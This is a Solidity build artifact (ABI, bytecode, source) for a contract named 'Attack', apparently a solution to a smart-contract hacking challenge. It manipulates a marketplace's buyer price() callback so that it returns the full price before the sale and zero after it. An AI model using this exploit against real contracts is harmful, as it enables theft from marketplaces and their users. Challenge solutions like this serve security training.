{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "run",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "internalType": "string",
              "name": "description",
              "type": "string"
            },
            {
              "internalType": "address",
              "name": "seller",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "buyer",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "auctionPrice",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "directBuyPrice",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "finalPrice",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "timeLimitForAuction",
              "type": "uint256"
            },
            {
              "internalType": "bool",
              "name": "isSold",
              "type": "bool"
            }
          ],
          "internalType": "struct ProductI.Product",
          "name": "_product",
          "type": "tuple"
        }
      ],
      "name": "price",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610310806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063522bb7041461003b578063fa73d81114610057575b600080fd5b6100556004803603810190610050919061016b565b610087565b005b610071600480360381019061006c91906101bd565b6100f6565b60405161007e9190610237565b60405180910390f35b8073ffffffffffffffffffffffffffffffffffffffff16638642269e60006040518263ffffffff1660e01b81526004016100c1919061021c565b600060405180830381600087803b1580156100db57600080fd5b505af11580156100ef573d6000803e3d6000fd5b5050505050565b60008160e001602081019061010b9190610194565b61011b5781608001359050610120565b600090505b919050565b600081359050610134816102ac565b92915050565b600081359050610149816102c3565b92915050565b6000610100828403121561016257600080fd5b81905092915050565b60006020828403121561017d57600080fd5b600061018b84828501610125565b91505092915050565b6000602082840312156101a657600080fd5b60006101b48482850161013a565b91505092915050565b6000602082840312156101cf57600080fd5b600082013567ffffffffffffffff8111156101e957600080fd5b6101f58482850161014f565b91505092915050565b6102078161029a565b82525050565b61021681610290565b82525050565b600060208201905061023160008301846101fe565b92915050565b600060208201905061024c600083018461020d565b92915050565b600061025d82610270565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102a582610290565b9050919050565b6102b581610252565b81146102c057600080fd5b50565b6102cc81610264565b81146102d757600080fd5b5056fea2646970667358221220998e7e441f99c945457a539470355b5fadbd1bf54c8023d4bcf9a941fc4756bd64736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\npragma solidity >= 0.8.0;\n\ninterface ProductI {\n    struct Product {\n        string description;\n        address seller;\n        address buyer;\n        uint256 auctionPrice;\n        uint256 directBuyPrice;\n        uint256 finalPrice;\n        uint256 timeLimitForAuction;\n        bool isSold;\n    }\n}\n\ninterface BlockScout24Buyer is ProductI {\n    function price(Product calldata _product) external returns (uint256);\n}\n\ninterface BlockScout24 is ProductI {\n    function buyProduct(uint256 _productId) external;\n    function addProduct(string calldata _description, uint256 _auctionPrice, uint256 _directBuyPrice) external;\n}\n\n\ncontract Seller {\n    function run(address _address) external {\n        BlockScout24(_address).addProduct(\"good product\", 1 ether, 3 ether);\n    }\n}\n\ncontract Attack is BlockScout24Buyer {\n    function run(address _address) external {\n        BlockScout24(_address).buyProduct(0);\n    }\n    \n    function price(Product calldata _product) external pure override returns (uint256) {\n        if (!_product.isSold) {\n            return _product.directBuyPrice;\n        } else {\n            return 0;\n        }\n    }\n}",
  "sourcePath": "/Users/simonperriard/Documents/Personnal/HackTheContract_Solutions/contracts/attacks/08.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.2",
  "updatedAt": "2021-08-18T07:32:40.516Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}